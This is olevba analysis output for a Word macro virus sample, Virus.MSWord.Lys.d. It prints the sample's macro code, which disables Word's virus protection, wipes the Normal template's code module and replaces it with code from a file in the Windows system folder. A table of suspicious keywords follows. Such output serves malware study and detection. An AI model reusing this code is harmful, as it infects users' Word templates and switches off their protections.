olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lys.d-b56a02b23049686ae277988665dddfe15be749e2
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lys.d-b56a02b23049686ae277988665dddfe15be749e2 
in file: Virus.MSWord.Lys.d-b56a02b23049686ae277988665dddfe15be749e2 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set Jamie = WScript.CreateObject("Word.Application")
Jamie.Options.VirusProtection = False
Jamie.Options.SaveNormalPrompt = False
For x = 1 To Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Jamie.sys")
Jamie.Application.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

